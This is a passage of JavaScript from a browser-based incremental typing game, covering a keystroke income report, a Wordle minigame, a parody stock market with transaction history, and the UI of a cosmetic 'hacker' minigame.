    const baseManualKeystrokeValue = applyKPStoManual(1); // Apply KPS to manual keystrokes
    const modifiedManualKeystrokeValue = applyModifiers(0, baseManualKeystrokeValue); // Apply modifiers
    
    
    const passiveIncome = getPassiveIncome();
    // List modifiers that increase manual keystrokes value
    const manualModifiers = modifiers
    .filter(mod => mod.affectedBuildings && mod.affectedBuildings.includes(0))
    .map(mod => {
        const kps = typeof mod.getKPStoManual === 'function'
        ? mod.getKPStoManual()
        : mod.KPStoManual;
        if(kps) {
            const flatBoost = kps * getPassiveIncome();
            return `<li><span class="modifierName">${mod.name}:</span> <span class="modifierValue">+${formatShortScale(flatBoost)} (${(kps * 100).toFixed(2)}% of passive income)</span></li>`;
        } else {
            return ``;
        }
    });
    
    // List multipliers for manual keystrokes
    const activeModifiers = modifiers
    .filter(mod => mod.affectedBuildings && mod.affectedBuildings.includes(0))
    .map(mod => {
        const multiplier = typeof mod.getMultiplier === 'function'
        ? mod.getMultiplier()
        : mod.multiplier || 1;
        const percentage = ((multiplier - 1) * 100).toFixed(2);
        return {
            name: mod.name,
            multiplier,
            percentage
        };
    });
    
    let modifiersDetails = activeModifiers.length
    ? activeModifiers.map(mod => `<li><span class="modifierName">${mod.name}:</span> <span class="modifierValue">+${mod.percentage}%</span></li>`).join("")
    : '<li>None</li>';
    
    // Compute total multiplier
    const totalMultiplier = activeModifiers.reduce(
        (acc, mod) => acc * mod.multiplier,
        1
    );
    
    let manualFlatModifiersDetails = manualModifiers.length
    ? manualModifiers.join("")
    : '<li>None</li>';
    
    
    if(manualFlatModifiersDetails === "") {
        manualFlatModifiersDetails = '<li>None</li>';
    }
      let newHTML = `
        <div class="report-receipt">
            <div class="report-header">
                <img src="/images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin">
                <h3>Manual Keystrokes</h3>
            </div>
            <div class="report-description">Value per keystroke when typing manually</div>
            <div class="report-stats">
                <div class="report-stat">
                    <div class="report-stat-label">Base Value</div>
                    <div class="report-stat-value">1</div>
                </div>
                <div class="report-stat">
                    <div class="report-stat-label">After Flat</div>
                    <div class="report-stat-value">${formatShortScale(baseManualKeystrokeValue)}</div>
                </div>
                <div class="report-stat">
                    <div class="report-stat-label">Multiplier</div>
                    <div class="report-stat-value">${totalMultiplier.toFixed(2)}x</div>
                </div>
                <div class="report-stat">
                    <div class="report-stat-label">Final Value</div>
                    <div class="report-stat-value">${formatShortScale(modifiedManualKeystrokeValue)}</div>
                </div>
            </div>
            <div class="report-modifiers">
                <div class="report-modifiers-header">Flat Modifiers</div>
                <ul class="report-modifiers-list">${manualFlatModifiersDetails}</ul>
            </div>
            <div class="report-modifiers">
                <div class="report-modifiers-header">Multiplier Modifiers</div>
                <ul class="report-modifiers-list">${modifiersDetails}</ul>
            </div>
            <div class="report-summary">
                <span class="report-summary-label">Per Keystroke Value</span>
                <span class="report-summary-value">${formatShortScale(modifiedManualKeystrokeValue)}</span>
            </div>
        </div>
    `;
    if(manualIncomeReport.innerHTML != newHTML) {
        manualIncomeReport.innerHTML = newHTML;
        manualIncomeReport.querySelector('.report-receipt').classList.add('updated');
        setTimeout(() => {
            manualIncomeReport.querySelector('.report-receipt').classList.remove('updated');
        }, 500); // Remove class after animation
    }
}
let currentWordleWord = "";
let wordleBoostRemaining = 0;
let currentGuessCount = 0;
const maxGuesses = 5;
let wordleUIState = "";

const legalKeys = [...'ABCDEFGHIJKLMNOPQRSTUVWXYZ\''];
function displayWordle() {
  if(AutoWriter.level > 0) {
    document.getElementById('wordle-tab').disabled = false;
  }
  let wordleBoost = modifiers.find(modifier => modifier.name === "Wordle Boost");
  if(wordleBoost) {
    document.getElementById('wordle-boost-remaining').textContent = `Boost remaining: ${(wordleBoost.duration / Tickrate).toFixed(0)}s`;
    if(wordleUIState != "boost") {
      // Activate the boost UI
      wordleUIState = "boost";
      document.getElementById('wordle-tab').classList.remove("ready");
      document.getElementById('wordle-game').classList.add('boost-active');
      document.getElementById('wordle-feedback').textContent = "Correct! Boost activated! Doubled production from Auto Writers and manually typed words";
    }
  } else {
    if(wordleUIState != "init") {
      if(wordleUIState == "loss") return; // Don't reset if the player just lost
      if(wordleUIState != "load") {
        // Start a new Wordle if we didnt just load the game
        currentWordleWord = getRandomWord();
        while (currentWordleWord.length > 5) {
          currentWordleWord = getRandomWord();
        }
      }
      // Initialize the Wordle UI for a new game.
      wordleUIState = "init";
      currentGuessCount = 0;
      document.getElementById('wordle-tab').classList.add("ready");
      document.getElementById('wordle-game').classList.remove('boost-active');
      document.getElementById('wordle-boost-remaining').textContent = ``;
      document.getElementById('wordle-hint').textContent = `Hint: ${wordsList[currentWordleWord].definition}`;
      document.getElementById('additional-wordle-hint').textContent = `Example: ${censorWord(wordsList[currentWordleWord].example)}`;
      document.getElementById('wordle-feedback').textContent = "Solve the Wordle to earn a boost!";
      resetWordleGrid();
      resetWordleKeyboard();
      renderWordleKeyboard();
    }
  }
}

function censorWord(example) {
  return example.replace(new RegExp(currentWordleWord, 'gi'), '*'.repeat(currentWordleWord.length));
}
let focusedTile;
let focusLostTimeout;
function resetWordleGrid() {
  const grid = document.getElementById('wordle-grid');
  grid.innerHTML = '';
  for (let i = 0; i < maxGuesses; i++) {
    const row = document.createElement('div');
    row.className = 'wordle-guess-row';
    row.style.display = 'flex';
    row.style.marginBottom = '10px';
    
    for (let j = 0; j < currentWordleWord.length; j++) {
      const tile = document.createElement('div');
      tile.className = 'wordle-tile';
      tile.setAttribute('contenteditable', i === currentGuessCount ? 'true' : 'false');
      tile.addEventListener('input', handleTileInput);
      tile.addEventListener('keydown', handleTileNavigation);
      // add focus events
      tile.addEventListener('focusin', (event) => {
        clearTimeout(focusLostTimeout);
        focusedTile = event.target;
      });
      tile.addEventListener('focusout', () => {
       focusLostTimeout = setTimeout(() => {
          focusedTile = null;
        }, 100);
      });
      row.appendChild(tile);
    }
    grid.appendChild(row);
  }
}

function handleTileInput(event) {
  const tile = event.target;
  const row = tile.parentNode;
  const tiles = Array.from(row.getElementsByClassName('wordle-tile'));
  
  if (tile.textContent.length > 1) {
    tile.textContent = tile.textContent[0]; // Limit to one character
  }
  
  const nextTile = tiles[tiles.indexOf(tile) + 1];
  if (nextTile && tile.textContent !== '') {
    nextTile.focus();
  }
  
  if (tiles.every(t => t.textContent.length === 1)) {
    validateWord(row);
  }
}

function handleTileNavigation(event) {
  const tile = event.target;
  const row = tile.parentNode;
  const tiles = Array.from(row.getElementsByClassName('wordle-tile'));
  const index = tiles.indexOf(tile);
  
  if (event.key === 'Backspace' && tile.textContent === '' && index > 0) {
    tiles[index - 1].focus();
  } else if (event.key === 'ArrowLeft' && index > 0) {
    tiles[index - 1].focus();
  } else if (event.key === 'ArrowRight' && index < tiles.length - 1) {
    tiles[index + 1].focus();
  }
}

function validateWord(row) {
  const tiles = Array.from(row.getElementsByClassName('wordle-tile'));
  const guess = tiles.map(tile => tile.textContent.toUpperCase()).join('');
  
  if (guess.length !== currentWordleWord.length) {
    document.getElementById('wordle-feedback').textContent = `Enter a ${currentWordleWord.length}-letter word!`;
    return;
  }
  
  const targetWord = currentWordleWord.toUpperCase();
  const result = new Array(guess.length).fill('absent');
  const targetLetterCounts = {};
  
  // Count letters in target word
  for (let char of targetWord) {
    targetLetterCounts[char] = (targetLetterCounts[char] || 0) + 1;
  }
  
  // First pass: mark correct positions (green)
  for (let i = 0; i < guess.length; i++) {
    if (guess[i] === targetWord[i]) {
      result[i] = 'correct';
      targetLetterCounts[guess[i]]--;
    }
  }
  
  // Second pass: mark present letters (yellow) for remaining positions
  for (let i = 0; i < guess.length; i++) {
    if (result[i] === 'absent' && targetLetterCounts[guess[i]] > 0) {
      result[i] = 'present';
      targetLetterCounts[guess[i]]--;
    }
  }
    // Apply colors to tiles and keyboard
  tiles.forEach((tile, index) => {
    const letter = guess[index];
    const keyElement = document.querySelector(`.wordle-key[data-key="${letter}"]`);
    
    tile.classList.add(result[index]);
    if (keyElement) {
      // For keyboard, prioritize correct > present > absent
      if (result[index] === 'correct') {
        // Always apply correct, remove any other states
        keyElement.classList.remove('present', 'absent');
        keyElement.classList.add('correct');
      } else if (result[index] === 'present' && !keyElement.classList.contains('correct')) {
        // Only apply present if key isn't already correct
        keyElement.classList.remove('absent');
        keyElement.classList.add('present');
      } else if (result[index] === 'absent' && !keyElement.classList.contains('correct') && !keyElement.classList.contains('present')) {
        // Only apply absent if key isn't already correct or present
        keyElement.classList.add('absent');
      }
    }
    tile.setAttribute('contenteditable', 'false'); // Make the tile non-editable after submission
  });
  
  currentGuessCount++;
  
  if (guess === currentWordleWord.toUpperCase()) {
    document.getElementById('wordle-feedback').textContent = "Correct! Boost activated! Doubled production from Auto Writers and manually typed words.";
    activateWordleBoost();
    gtag('event', 'wordle_win', {
      'event_category': 'Wordle',
      'word': currentWordleWord
    });
  } else if (currentGuessCount >= maxGuesses) {
    document.getElementById('wordle-feedback').innerHTML = `Out of guesses! The word was: <strong>${currentWordleWord}</strong>. Starting a new Wordle...`;
    wordleUIState = "loss";
    document.getElementById('wordle-tab').classList.remove("ready");
    setTimeout(() => {
      wordleUIState = "";
    }, 5000);
    gtag('event', 'wordle_wrong_guess', {
      'event_category': 'Wordle',
      'word': currentWordleWord,
      'guess': guess
    });
    gtag('event', 'wordle_loss', {
      'event_category': 'Wordle',
      'word': currentWordleWord
    });
  } else {
    document.getElementById('wordle-feedback').textContent = "Try again!";
    prepareNextRow();
    gtag('event', 'wordle_wrong_guess', {
      'event_category': 'Wordle',
      'word': currentWordleWord,
      'guess': guess
    });
  }
}

function prepareNextRow() {
  const grid = document.getElementById('wordle-grid');
  const nextRow = grid.getElementsByClassName('wordle-guess-row')[currentGuessCount];
  Array.from(nextRow.getElementsByClassName('wordle-tile')).forEach(tile => {
    tile.setAttribute('contenteditable', 'true');
    tile.textContent = '';
  });
}
function activateWordleBoost() {
  wordlesSolved++;
  spawnBoost(0);
}

function resetWordleKeyboard() {
  // Reset all keyboard key colors
  document.querySelectorAll('.wordle-key').forEach(key => {
    key.classList.remove('correct', 'present', 'absent');
  });
}


const stocks = [
    { id: 0, name: "Logifetch", nameref: "Logitech", icon: "/images/stocks/logifetch.webp", price: 60, owned: 0, history: [] },
    { id: 1, name: "Coarseair", nameref: "Corsair", icon: "/images/stocks/coarseair.webp", price: 60, owned: 0, history: [] },
    { id: 2, name: "Laser", nameref: "Razer", icon: "/images/stocks/laser.webp", price: 60, owned: 0, history: [] },
    { id: 3, name: "PlasticSeries", nameref: "SteelSeries", icon: "/images/stocks/plasticseries.webp", price: 60, owned: 0, history: [] },
    { id: 4, name: "Megasoft", nameref: "Microsoft", icon: "/images/stocks/megasoft.webp", price: 60, owned: 0, history: [] },
    { id: 5, name: "Pineapple", nameref: "Apple", icon: "/images/stocks/pineapple.webp", price: 60, owned: 0, history: [] },
    { id: 6, name: "HP Sauce", nameref: "HP", icon: "/images/stocks/hp-sauce.webp", price: 60, owned: 0, history: [] },
    { id: 7, name: "Smell", nameref: "Dell", icon: "/images/stocks/smell.webp", price: 60, owned: 0, history: [] },
    { id: 8, name: "AS IF", nameref: "Asus", icon: "/images/stocks/as-if.webp", price: 60, owned: 0, history: [] },
    { id: 9, name: "Cooler Blaster", nameref: "Cooler Master", icon: "/images/stocks/cooler-blaster.webp", price: 60, owned: 0, history: [] }
];

// New transaction history array
const transactionHistory = [];

const maxStockPrice = 200;
const minStockPrice = 1;
const averageStockPrice = 60;
const maxStockOwned = 100;

/**
 * 1 dollar = 60 seconds of keystroke passive income.
 * @param {*} dollars 
 * @returns 
 */
function dollarsToKeystrokes(dollars) {
    return dollars * getPassiveIncomeWithoutTempBoosts();
}

function keystrokesToDollars(keystrokes) {
    return keystrokes / getPassiveIncomeWithoutTempBoosts();
}

function initStockMarket() {
    const stockMarket = document.getElementById("stock-market-container");
    stocks.forEach((stock, index) => {
        const stockElement = document.createElement("div");
        stockElement.classList.add("stock");
        //<span class="stock-reference">${stock.nameref}</span>
        stockElement.innerHTML = `
        <div class="stock-header" style="background-image: url(${stock.icon})">
            <div class="stock-status-indicator"></div>
            <h3>${stock.name}</h3>
        </div>
        <div class="stock-info" id="stock-${index}">
            <div class="stock-price-container">
                <div class="stock-price-left">
                    <p class="stock-price-label">Price:</p>
                    <p class="stock-price" id="stock-price-${index}">$${stock.price.toFixed(2)}</p>
                </div>
                <div class="stock-change-container">
                    <p class="stock-change" id="stock-change-${index}">0.00%</p>
                    <span id="stock-arrow-${index}">◆</span>
                </div>
            </div>
            <p class="stock-holdings">Owned: <span id="stock-owned-${index}">${stock.owned}/${maxStockOwned}</span></p>
            <div class="stock-chart-container">
              <canvas id="stock-chart-${index}" width="280" height="80"></canvas>
            </div>
            <div class="stock-controls">
                <div class="stock-action-group">
                    <p>Buy:</p>
                    <div class="stock-buttons">
                        <button id="stock-${index}-buy-1" onclick="buyStock(${index}, 1)" onmouseover="showStockBuyTooltip(document.getElementById('stock-${index}'), 1, stocks[${index}])" onmouseout="hideTooltip()">1</button>
                        <button id="stock-${index}-buy-10" onclick="buyStock(${index}, 10)" onmouseover="showStockBuyTooltip(document.getElementById('stock-${index}'), 10, stocks[${index}])" onmouseout="hideTooltip()">10</button>
                        <button id="stock-${index}-buy-100" onclick="buyStock(${index}, 100)" onmouseover="showStockBuyTooltip(document.getElementById('stock-${index}'), 100, stocks[${index}])" onmouseout="hideTooltip()">100</button>
                    </div>
                </div>
                <div class="stock-action-group">
                    <p>Sell:</p>
                    <div class="stock-buttons">
                        <button id="stock-${index}-sell-1" onclick="sellStock(${index}, 1)" onmouseover="showStockSellTooltip(document.getElementById('stock-${index}'), 1, stocks[${index}])" onmouseout="hideTooltip()">1</button>
                        <button id="stock-${index}-sell-10" onclick="sellStock(${index}, 10)" onmouseover="showStockSellTooltip(document.getElementById('stock-${index}'), 10, stocks[${index}])" onmouseout="hideTooltip()">10</button>
                        <button id="stock-${index}-sell-100" onclick="sellStock(${index}, 100)" onmouseover="showStockSellTooltip(document.getElementById('stock-${index}'), 100, stocks[${index}])" onmouseout="hideTooltip()">100</button>
                    </div>
                </div>
            </div>
        </div>
        `;
        stockMarket.appendChild(stockElement);
    });
    
    // Create transaction history section
    const stockPage = document.getElementById("stockPage");
    const transactionSection = document.createElement("div");
    transactionSection.id = "transaction-history-section";
    transactionSection.innerHTML = `
        <h2>Transaction History</h2>
        <div class="transaction-filters">
            <button id="filter-all-transactions" class="active" onclick="filterTransactions('all')">All</button>
            <button id="filter-buy-transactions" onclick="filterTransactions('buy')">Buy</button>
            <button id="filter-sell-transactions" onclick="filterTransactions('sell')">Sell</button>
        </div>
        <div class="transaction-list" id="transaction-list"></div>
    `;
    stockPage.appendChild(transactionSection);
    
    // After the elements are created, initialize the charts
    initStockCharts();
    fluctuateStockPrices();
    setInterval(fluctuateStockPrices, 1000 * 60); // Update every minute
    
    // Initialize transaction history
    displayTransactionHistory();
}

let stockCharts = []; // will hold our Chart.js objects

function initStockCharts() {
    stocks.forEach((stock, index) => {
        const ctx = document.getElementById(`stock-chart-${index}`).getContext("2d");
        
        const chart = new Chart(ctx, {
            type: "line",
            data: {
                labels: [], // filled dynamically
                datasets: [{
                    label: stock.name,
                    data: [],  // price history
                    borderColor: "rgb(255, 215, 0)",
                    backgroundColor: "rgba(255, 215, 0, 0.2)",
                    fill: true,
                    tension: 0.1,
                    borderWidth: 2,
                    pointRadius: 0,
                    pointHoverRadius: 3
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                animation: false,
                interaction: {
                    intersect: false,
                    mode: 'index'
                },
                scales: {
                    x: {
                        display: false  // Hide X-axis labels (or use time axis if you prefer)
                    },
                    y: {
                        min: 1,         // Set minimum value on Y-axis
                        max: 200,       // Set maximum value on Y-axis
                        display: false  // Hide Y-axis for cleaner look
                    }
                },
                plugins: {
                    legend: {
                        display: false // Hide legend if you only have one dataset
                    },
                    tooltip: {
                        mode: 'index',
                        intersect: false,
                        enabled: true,
                        callbacks: {
                            title: function() {
                                return stock.name;
                            },
                            label: function(context) {
                                return `Price: $${context.parsed.y.toFixed(2)}`;
                            }
                        }
                    }
                }
            }
        });

        stockCharts.push(chart);

        // Add initial loaded data.
        const dataset = chart.data.datasets[0];
        stock.history.forEach(price => {
            dataset.data.push(price);
            chart.data.labels.push("");
        });
        
        chart.update();
    });
}

function displayStockMarket() {
    if(StockMarket.level > 0) {
        document.getElementById("stock-tab").disabled = false;
    }
    document.getElementById("dollarCost").textContent = formatShortScale(dollarsToKeystrokes(1));
    //document.getElementById("stockCurrentKeystrokes").textContent = formatShortScale(keystrokesBank);
    document.getElementById("stockCurrentDollars").textContent = formatShortScale(keystrokesToDollars(keystrokesBank));
    document.getElementById("stockProfitDollars").textContent = formatShortScale(stockProfitDollars);
    //document.getElementById("stockProfitKeystrokes").textContent = formatShortScale(stockProfitKeystrokes);
    stocks.forEach((stock, index) => {
        document.getElementById(`stock-price-${index}`).textContent = `$${stock.price.toFixed(2)}`;
        document.getElementById(`stock-owned-${index}`).textContent = `${stock.owned}/${maxStockOwned}`;
          // Update price change indicator
        if (stock.history.length >= 2) {
            const currentPrice = stock.price;
            const previousPrice = stock.history[stock.history.length - 2] || currentPrice;
            const priceChange = currentPrice - previousPrice;
            const priceChangePercent = (priceChange / previousPrice) * 100;
            
            const changeElement = document.getElementById(`stock-change-${index}`);
            const arrowElement = document.getElementById(`stock-arrow-${index}`);
            const priceElement = document.getElementById(`stock-price-${index}`);
            
            changeElement.textContent = `${Math.abs(priceChangePercent).toFixed(2)}%`;
            
            // Remove previous classes
            //priceElement.classList.remove('price-up', 'price-down');
            
            if (priceChange > 0) {
                changeElement.classList.remove('negative');
                changeElement.classList.add('positive');
                arrowElement.textContent = '▲';
                arrowElement.classList.remove('negative');
                arrowElement.classList.add('positive');

                priceElement.classList.add('price-up');
                priceElement.classList.remove('price-down');
                // Add visual feedback for price increase
                //setTimeout(() => priceElement.classList.add('price-up'), 10);
            } else if (priceChange < 0) {
                changeElement.classList.remove('positive');
                changeElement.classList.add('negative');
                arrowElement.textContent = '▼';
                arrowElement.classList.remove('positive');
                arrowElement.classList.add('negative');

                priceElement.classList.add('price-down');
                priceElement.classList.remove('price-up');
                // Add visual feedback for price decrease
                //setTimeout(() => priceElement.classList.add('price-down'), 10);
            } else {
                changeElement.classList.remove('positive', 'negative');
                arrowElement.textContent = '◆';
                arrowElement.classList.remove('positive', 'negative');
                priceElement.classList.remove('price-up', 'price-down');
            }
        }
        
        const buy1Button = document.getElementById(`stock-${index}-buy-1`);
        const buy10Button = document.getElementById(`stock-${index}-buy-10`);
        const buy100Button = document.getElementById(`stock-${index}-buy-100`);
        const sell1Button = document.getElementById(`stock-${index}-sell-1`);
        const sell10Button = document.getElementById(`stock-${index}-sell-10`);
        const sell100Button = document.getElementById(`stock-${index}-sell-100`);
        
        buy1Button.disabled = keystrokesBank < dollarsToKeystrokes(stock.price);
        buy10Button.disabled = keystrokesBank < dollarsToKeystrokes(stock.price * 10);
        buy100Button.disabled = keystrokesBank < dollarsToKeystrokes(stock.price * 100);
        
        sell1Button.disabled = stock.owned < 1;
        sell10Button.disabled = stock.owned < 10;
        sell100Button.disabled = stock.owned < 100;
    });
}

function fluctuateStockPrices() {
    stocks.forEach((stock, index) => {
        const previousPrice = stock.price;
        const fluctuation = (Math.random() - 0.5) * 10; // Random fluctuation between -5 and +5
        stock.price = Math.max(minStockPrice, Math.min(maxStockPrice, stock.price + fluctuation));

        // Update the price history
        stock.history.push(stock.price);
        if (stock.history.length > 50) {   // keep only the last 50 points
            stock.history.shift();
        }
        
        // Update the chart data
        const chart = stockCharts[index];
        const dataset = chart.data.datasets[0];
        
        // Add new data point
        dataset.data.push(stock.price);
        if (dataset.data.length > 50) {
            dataset.data.shift();
        }
        
        // Add a blank label or a time label
        chart.data.labels.push(""); 
        if (chart.data.labels.length > 50) {
            chart.data.labels.shift();
        }
        
        // Finally, update the chart
        chart.update();
    });
}

function buyStock(stockIndex, amount) {
    playClickSound();
    const stock = stocks[stockIndex];
    const cost = dollarsToKeystrokes(stock.price * amount);
    if (keystrokesBank >= cost && stock.owned + amount <= maxStockOwned) {
        stockProfitDollars -= stock.price * amount;
        stockProfitKeystrokes -= cost
        keystrokesBank -= cost;
        stock.owned += amount;
        
        // Record transaction
        addTransaction('buy', stock, amount, stock.price, cost);
        
        displayTransactionHistory();
    }
}

function sellStock(stockIndex, amount) {
    playClickSound();
    const stock = stocks[stockIndex];
    if (stock.owned >= amount) {
        const revenue = dollarsToKeystrokes(stock.price * amount);
        stockProfitDollars += stock.price * amount;
        stockProfitKeystrokes += revenue;
        keystrokesBank += revenue;
        stock.owned -= amount;
        
        // Record transaction
        addTransaction('sell', stock, amount, stock.price, revenue);
        
        displayTransactionHistory();
    }
}

// Transaction history functions
function addTransaction(type, stock, amount, price, keystrokesValue) {
    const transaction = {
        id: transactionHistory.length,
        type: type,
        stockId: stock.id,
        stockName: stock.name,
        amount: amount,
        price: price,
        totalDollars: price * amount,
        totalKeystrokes: keystrokesValue,
        timestamp: Date.now()
    };
    
    transactionHistory.unshift(transaction); // Add to beginning of array
    
    // Limit history size to prevent memory issues
    if (transactionHistory.length > 100) {
        transactionHistory.pop();
    }
}

function displayTransactionHistory(filter = 'all') {
    const transactionList = document.getElementById('transaction-list');
    if (!transactionList) return;
    
    transactionList.innerHTML = '';
    
    if (transactionHistory.length === 0) {
        transactionList.innerHTML = '<div class="no-transactions">No transactions recorded yet</div>';
        return;
    }
    
    const filteredTransactions = filter === 'all' 
        ? transactionHistory 
        : transactionHistory.filter(t => t.type === filter);
        
    filteredTransactions.forEach(transaction => {
        const transactionItem = document.createElement('div');
        transactionItem.classList.add('transaction-item', transaction.type);
        
        const date = new Date(transaction.timestamp);
        const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
        
        transactionItem.innerHTML = `
            <div class="transaction-icon ${transaction.type}"></div>
            <div class="transaction-details">
                <div class="transaction-header">
                    <span class="transaction-stock">${transaction.stockName}</span>
                    <span class="transaction-date">${formattedDate}</span>
                </div>
                <div class="transaction-info">
                    <span class="transaction-type">${transaction.type === 'buy' ? 'Purchased' : 'Sold'} ${transaction.amount} shares</span>
                    <span class="transaction-price">@ $${transaction.price.toFixed(2)}</span>
                </div>
                <div class="transaction-total">
                    <span>Total: $${transaction.totalDollars.toFixed(2)}</span>
                    <span>(${formatShortScale(transaction.totalKeystrokes)} keystrokes)</span>
                </div>
            </div>
        `;
        
        transactionList.appendChild(transactionItem);
    });
}

function filterTransactions(filter) {
    // Update active button
    document.getElementById('filter-all-transactions').classList.remove('active');
    document.getElementById('filter-buy-transactions').classList.remove('active');
    document.getElementById('filter-sell-transactions').classList.remove('active');
    document.getElementById(`filter-${filter}-transactions`).classList.add('active');
    
    // Display filtered transactions
    displayTransactionHistory(filter);
}

// Add this to the save.js loadGame function
function loadTransactionHistory(savedTransactions) {
    if (savedTransactions) {
        transactionHistory.length = 0; // Clear existing
        savedTransactions.forEach(transaction => transactionHistory.push(transaction));
    }
}

let hackerHijackActive = false;
let hackerConnected = false;
let hackerCrackActive = false;
let hackerHijackStartTime = 0;
let hackerPoints = [];
let hackerLines = [];
let hackerUIState = "";
let hackerCodeBackDrop = "";
const hackerRaceTargetKeystrokes = 300;
const hackerCanvas = document.getElementById('hacker-canvas');
const hackerCtx = hackerCanvas.getContext('2d');
let hackerDraggingPoint = null;
let hackerCurrentLevel = 1;
let hackerGridVisible = true;
let hackerParticles = [];
let hackerLastTimeUpdate = 0;

// New variables for enhanced visuals and effects
let hackerPulseEffect = 0;
let hackerGridOffset = 0;
let hackerBackgroundHue = 120; // Green hue
let hackerConnectionStatus = [];
let hackerHintActive = false;
let hackerHintTimeout = null;
let hackerCompletedConnections = 0;
let hackerTotalConnections = 0;

// Add new variables for enhanced visuals
let hackerNodeColors = [];
let hackerNodeGlow = [];
let hackerHoveredPoint = null;
let hackerSuccessParticles = [];
let hackerConnectionsJustCompleted = [];

function displayHacker() {
    if(HackerGroup.level > 0) {
        document.getElementById('hacker-tab').disabled = false;
    }
    let finishBoost = modifiers.find(modifier => modifier.id === 6 || modifier.id === 10 || modifier.id === 11);
    if(!finishBoost) {
        if(hackerHijackActive) {
            if(hackerUIState !== "hijack") {
                hackerUIState = "hijack";
                document.getElementById('hacker-tab').classList.remove("ready");
                document.getElementById('hacker-start').style.display = "none";
                document.getElementById('hacker-timeleft').style.display = "block";
                document.getElementById('hacker-cooldown').style.display = "none";
                hackerCanvas.style.display = "block";
                playSound('menuSound1');
            }
            const timeLeft = Math.max(0, 30 - (performance.now() - hackerHijackStartTime) / 1000).toFixed(1);
            document.getElementById('hacker-timeleft-remaining').innerText = timeLeft;
            updateHackMinigameProgress();
        } else if(hackerCrackActive) {
            if(hackerUIState !== "crack") {
                hackerUIState = "crack";
                document.getElementById('hacker-computer-main').innerHTML = "";
                document.getElementById('hacker-login-attempts').innerHTML = "";
                document.getElementById('hacker-computer-side').style.display = "none";
                document.getElementById('hacker-tab').classList.remove("ready");
                document.getElementById('hacker-start').style.display = "none";
                document.getElementById('hacker-canvas').style.display = "none";
                document.getElementById('hacker-computer').style.display = "flex";
                document.getElementById('hacker-timeleft').style.display = "none";
                document.getElementById('hacker-cooldown').style.display = "none";
                playSound('menuSound2');
            }
            hackerDrawComputer();
        } else {
            if(hackerConnected) {
                if(hackerUIState !== "connected") {
                    hackerUIState = "connected";
                    document.getElementById('hacker-tab').classList.remove("ready");
                    document.getElementById('hacker-start').style.display = "none";
                    document.getElementById('hacker-timeleft').style.display = "none";
                    document.getElementById('hacker-cooldown').style.display = "block";
                    document.getElementById('hacker-cooldown2').style.display = "none";
                    document.getElementById('hacker-access-granted').textContent = "Connecting...";
                    playSound('menuSound3');
                    
                    // Add a typing effect to the "Connecting..." text
                    let dots = "";
                    const connectingInterval = setInterval(() => {
                        dots = dots.length < 3 ? dots + "." : "";
                        document.getElementById('hacker-access-granted').textContent = "Connecting" + dots;
                    }, 500);
                    
                    // Clear interval when moving to crack phase
                    setTimeout(() => clearInterval(connectingInterval), 1500);
                }
            } else if(hackerUIState !== "ready") {
                hackerUIState = "ready";
                document.getElementById('hacker-tab').classList.add("ready");
                document.getElementById('hacker-timeleft').style.display = "none";
                document.getElementById('hacker-canvas').style.display = "block";
                document.getElementById('hacker-start').style.display = "block";
                document.getElementById('hacker-computer').style.display = "none";
                document.getElementById('hacker-reward').style.display = "none";
                document.getElementById('hacker-start-button').innerText = `Start Hijack - Level ${hackerCurrentLevel}`;
                document.getElementById('hacker-cooldown').style.display = "none";
                
                // Draw the ready screen with a cyberpunk-style animation
                hackerCtx.clearRect(0, 0, hackerCanvas.width, hackerCanvas.height);
                drawHackerReadyScreen();
            }
        }
    } else {
        if(finishBoost.id === 6) {
            // Lost hijack
            if(hackerUIState !== "failed") {
                hackerUIState = "failed";
                document.getElementById('hacker-tab').classList.remove("ready");
                document.getElementById('hacker-start').style.display = "none";
                document.getElementById('hacker-timeleft').style.display = "none";
                document.getElementById('hacker-cooldown').style.display = "block";
                document.getElementById('hacker-cooldown2').style.display = "block";
                document.getElementById('hacker-reward').style.display = "none";
                document.getElementById('hacker-access-granted').textContent = "Connection Failed!";
                document.getElementById('hacker-access-granted').style.color = "#ff3333";
                hackerCurrentLevel = 1;
            }
        } else if(finishBoost.id === 10) {
            // Cracked password
            if(hackerUIState !== "connected") {
                hackerUIState = "connected";
                document.getElementById('hacker-tab').classList.remove("ready");
                document.getElementById('hacker-start').style.display = "none";
                document.getElementById('hacker-timeleft').style.display = "none";
                document.getElementById('hacker-cooldown').style.display = "block";
                document.getElementById('hacker-cooldown2').style.display = "block";
                document.getElementById('hacker-reward').style.display = "block";
                document.getElementById('hacker-access-granted').textContent = "Access Granted!";
                document.getElementById('hacker-access-granted').style.color = "#33ff33";
                playSound('winSound');
                
                // Increase the level for next time
                hackerCurrentLevel = Math.min(5, hackerCurrentLevel + 1);
            }
        } else if(finishBoost.id === 11) {
            // Lost password
            if(hackerUIState !== "denied") {
                hackerUIState = "denied";
                document.getElementById('hacker-tab').classList.remove("ready");
                document.getElementById('hacker-start').style.display = "none";
                document.getElementById('hacker-timeleft').style.display = "none";
                document.getElementById('hacker-cooldown').style.display = "block";
                document.getElementById('hacker-cooldown2').style.display = "block";
                document.getElementById('hacker-reward').style.display = "none";
                document.getElementById('hacker-access-granted').textContent = "Access Denied!";
                document.getElementById('hacker-access-granted').style.color = "#ff3333";
                hackerCurrentLevel = 1;
            }
        }
        document.getElementById('hacker-cooldown-remaining').innerText = (finishBoost.duration / Tickrate).toFixed(0);
    }
}

// Draw the ready screen with a cyberpunk animation
function drawHackerReadyScreen() {
    const now = performance.now();
    const dt = (now - hackerLastTimeUpdate) / 1000;
    hackerLastTimeUpdate = now;
    
    // Draw grid background
    drawHackerGrid();
    
    // Animate the background hue
    hackerBackgroundHue = (hackerBackgroundHue + 10 * dt) % 360;
    
    // Draw a loading ring
    hackerCtx.strokeStyle = `hsl(${hackerBackgroundHue}, 100%, 50%)`;
    hackerCtx.lineWidth = 3;
    const centerX = hackerCanvas.width / 2;
    const centerY = hackerCanvas.height / 2;
    const radius = 50;
    
    hackerCtx.beginPath();
    hackerCtx.arc(centerX, centerY - 200, radius, 0, Math.PI * 2 * ((Math.sin(now / 1000) + 1) / 2));
    hackerCtx.stroke();
    
    // Draw level indicator
    hackerCtx.fillStyle = `hsl(${hackerBackgroundHue}, 100%, 50%)`;
    hackerCtx.font = '20px monospace';
    hackerCtx.textAlign = 'center';
    hackerCtx.fillText(`SYSTEM SECURITY: LEVEL ${hackerCurrentLevel}`, centerX, centerY - 270);
    
    // Request next animation frame if still in ready state
    if (hackerUIState === "ready") {
